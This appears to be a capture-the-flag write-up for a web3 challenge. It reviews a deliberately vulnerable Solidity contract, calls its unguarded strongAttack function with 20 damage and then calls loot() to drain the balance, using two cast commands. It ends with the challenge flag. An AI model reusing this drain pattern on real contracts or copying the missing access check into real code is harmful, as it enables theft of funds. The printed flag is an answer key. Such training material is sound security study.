# Survival of the Fittest

### CHALLENGE DESCRIPTION
**_Alex had always dreamed of becoming a warrior, but she wasn't particularly skilled. When the opportunity arose to join a group of seasoned warriors on a quest to a mysterious island filled with real-life monsters, she hesitated. But the thought of facing down fearsome beasts and emerging victorious was too tempting to resist, and she reluctantly agreed to join the group. As they made their way through the dense, overgrown forests of the island, Alex kept her senses sharp, always alert for the slightest sign of danger. But as she crept through the underbrush, sword drawn and ready, she was startled by a sudden movement ahead of her. She froze, heart pounding in her chest as she realized that she was face to face with her first monster._**


## Solution

**STEP 1: Code reviewing**
 
We're given 2 Solidity files:
 
>**`Setup.sol`**

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Creature} from "./Creature.sol";

contract Setup {
    Creature public immutable TARGET;

    constructor() payable {
        require(msg.value == 1 ether);
        TARGET = new Creature{value: 10}();
    }
    
    function isSolved() public view returns (bool) {
        return address(TARGET).balance == 0;
    }
}
```

>**`Creature.sol`**

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Creature {
    
    uint256 public lifePoints;
    address public aggro;

    constructor() payable {
        lifePoints = 20;
    }

    function strongAttack(uint256 _damage) external{
        _dealDamage(_damage);
    }
    
    function punch() external {
        _dealDamage(1);
    }

    function loot() external {
        require(lifePoints == 0, "Creature is still alive!");
        payable(msg.sender).transfer(address(this).balance);
    }

    function _dealDamage(uint256 _damage) internal {
        aggro = msg.sender;
        lifePoints -= _damage;
    }
}
```
To take the flag we should defeat our enemies with a lifePoints of 20. We have 2 options: `punch()` and `stringAttack(uint256 _damage)`. 

**STEP 2: Checking website**

Meeting our enemies ;)
![image](https://github.com/luvranse/web3/assets/46570641/2a64b0db-e3be-4682-a6ee-9a951051de1f)

Also you can check guide in `docs`.
![image](https://github.com/luvranse/web3/assets/46570641/1bbf0712-2ede-4a15-a45e-1533e63e4455)

Check the `connections` to find needed address `TargetAddress` and key `PrivateKey`.
![image](https://github.com/luvranse/web3/assets/46570641/999be50d-3c52-4199-a951-ca6916d8bc11)

**STEP 3: The Battle**

To interact with blockchain on /rpc endpoint we gonna use `cast`.

Let's fight:
```
cast send --rpc-url http://IP:PORT/rpc --private-key PRIVATE_KEY TARGET_ADDRESS "strongAttack(uint256)" 20
```
![image](https://github.com/luvranse/web3/assets/46570641/2f8c717f-f6d8-40aa-bfab-6b2726d41fb0)

After defeating the enemies, we can collect the loot.
```
cast send --rpc-url http://IP:PORT/rpc --private-key PRIVATE_KEY TARGET_ADDRESS "loot()"
```
![image](https://github.com/luvranse/web3/assets/46570641/7c18c04b-7c2a-4594-aa12-ef656168bf36)

Now we can get our flag. Congratz!
![image](https://github.com/luvranse/web3/assets/46570641/60e8686c-59c2-4234-a216-edbb2ff97027)

###FLAG
```
HTB{g0t_y0u2_f1r5t_b100d}
```
